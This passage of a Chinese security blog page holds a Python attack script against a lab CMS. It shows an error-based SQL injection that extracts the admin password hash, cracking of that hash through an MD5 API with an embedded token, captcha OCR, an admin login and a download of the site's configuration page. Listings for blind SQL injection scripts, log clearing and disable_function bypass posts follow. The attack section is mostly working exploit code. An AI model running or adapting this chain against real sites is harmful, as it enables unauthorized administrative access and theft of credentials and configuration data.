+<pre><code>passwd_url = &apos;http://192.168.101.128/inc/hits.php?tab=cw_info&amp;id=1 union select a from(select count(*),concat(0x5c,(SELECT pass from cw_admin),0x5c,floor(rand(0)*2))x from information_schema.tables group by x)a&apos;
+passwd_html = requests.get(passwd_url)
+passwd = re.findall(r&apos;\\(.*?)\\&apos;,passwd_html.text)
+
+
+return user[0],passwd[0]
+</code></pre><p>#解密借口详情<a href="http://www.ttmd5.com/api.php?lang=cn" target="_blank" rel="noopener">http://www.ttmd5.com/api.php?lang=cn</a><br>def decode_pass(passwd):<br>    decode_url = ‘<a href="http://www.ttmd5.com/do.php?c=Api&amp;m=crack&amp;uid=hiZuCl5lPiWZQ&amp;token=7a2edbf5e0651e86fbdf008d803a8b22&amp;cipher=&#39;" target="_blank" rel="noopener">http://www.ttmd5.com/do.php?c=Api&amp;m=crack&amp;uid=hiZuCl5lPiWZQ&amp;token=7a2edbf5e0651e86fbdf008d803a8b22&amp;cipher=&#39;</a> + passwd<br>    html = requests.get(decode_url)<br>    a = re.match(r’\”flag\”:1’,html.text)<br>    if a == ‘None’:<br>        exit(‘decode false’)<br>    else:<br>        passwd_de = re.findall(r’plain\”:\”(.*?)\”,\”flag’,html.text)<br>        print(‘success decoded : %s’ % passwd_de[0])<br>        return passwd_de[0]</p>
+<p>def login(user,passwd):<br>    login_url = ‘<a href="http://192.168.101.128/admin/index.php&#39;" target="_blank" rel="noopener">http://192.168.101.128/admin/index.php&#39;</a><br>    yzm_url = ‘<a href="http://192.168.101.128/inc/code.php&#39;" target="_blank" rel="noopener">http://192.168.101.128/inc/code.php&#39;</a><br>    info_url = ‘<a href="http://192.168.101.128/admin/cw_web.php&#39;" target="_blank" rel="noopener">http://192.168.101.128/admin/cw_web.php&#39;</a></p>
+<pre><code># 请求session开始，以后的请求都会被服务端记住
+s = requests.session()
+# 保存验证码图片
+yzm = s.get(yzm_url)
+with open(&apos;yzm.png&apos;, &apos;wb&apos;) as pic:
+    pic.write(yzm.content)
+    pic.close()
+# 识别验证码
+os.system(&apos;tesseract.exe yzm.png output -l eng&apos;)
+with open(&apos;output.txt&apos;) as f:
+    str = f.read(5)
+    f.close()
+# 登录数据
+login_data = {
+    &apos;user&apos;: user,
+    &apos;pass&apos;: passwd,
+    &apos;yzm&apos;: str,
+    &apos;act&apos;: &apos;login&apos;
+}
+# 登录请求
+s.post(login_url, login_data)
+# 下载含有网站配置信息的网页
+info = s.get(info_url)
+with open(&apos;info.html&apos;, &apos;wb&apos;) as info_html:
+    info_html.write(info.content)
+    info_html.close()
+</code></pre><p>def main():<br>    user,passwd = sql()<br>    print(‘user:%s \npasswd:%s’ % (user, passwd))<br>    passwd = decode_pass(passwd)<br>    login(user,passwd)</p>
+<p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    main()</p>
+<p><code>`</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/03/01/python识别验证码/" data-id="cjf199x6c000mwsazdqpjfy1i" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-python-多线程得到域名ip" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/08/08/python-多线程得到域名ip/" class="article-date">
+  <time datetime="2017-08-08T05:57:36.000Z" itemprop="datePublished">2017-08-08</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/python/">python</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/08/08/python-多线程得到域名ip/">python 多线程得到域名ip</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>得到一个域名列表对应的ip</p>
+        
+          <p class="article-more-link">
+            <a href="/2017/08/08/python-多线程得到域名ip/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/08/08/python-多线程得到域名ip/" data-id="cjf199x5v0005wsazpi83oiso" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-python-处理wydomain域名" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/08/08/python-处理wydomain域名/" class="article-date">
+  <time datetime="2017-08-08T05:28:18.000Z" itemprop="datePublished">2017-08-08</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/python/">python</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/08/08/python-处理wydomain域名/">python 处理wydomain域名</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在信息收集时,用到两个工具,一个是猪猪侠的wydomain,一个是lijiejie的BBScan.<br>希望将wydomain得到的域名结果,处理成一行一个,这样方便用BBScan批量扫描敏感信息泄露.于是写个脚本,顺便练习一下python.</p>
+        
+          <p class="article-more-link">
+            <a href="/2017/08/08/python-处理wydomain域名/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/08/08/python-处理wydomain域名/" data-id="cjf199x5t0004wsazlu9et4gg" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-python-简单时间盲注脚本" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/08/08/python-简单时间盲注脚本/" class="article-date">
+  <time datetime="2017-08-08T04:25:52.000Z" itemprop="datePublished">2017-08-08</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/python/">python</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/08/08/python-简单时间盲注脚本/">python 简单盲注脚本</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>简单的跑单一数据的时间,布尔sql注入脚本</p>
+        
+          <p class="article-more-link">
+            <a href="/2017/08/08/python-简单时间盲注脚本/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/08/08/python-简单时间盲注脚本/" data-id="cjf199x68000jwsazm67a8w4o" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/dns劫持/">dns劫持</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/proxy/">proxy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/">windows</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/dns劫持/" style="font-size: 10px;">dns劫持</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/proxy/" style="font-size: 10px;">proxy</a> <a href="/tags/python/" style="font-size: 20px;">python</a> <a href="/tags/sql注入/" style="font-size: 10px;">sql注入</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/03/01/lfi-phpinfo/">lfi-phpinfo</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/01/windows日志清除/">windows日志清除</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/01/reGeorg-proxychains4-F-NAScan/">reGeorg+proxychains4+F-NAScan</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/01/DNS劫持修改页面/">DNS劫持修改页面</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/01/php-disable-function-bypass/">php disable_function bypass</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
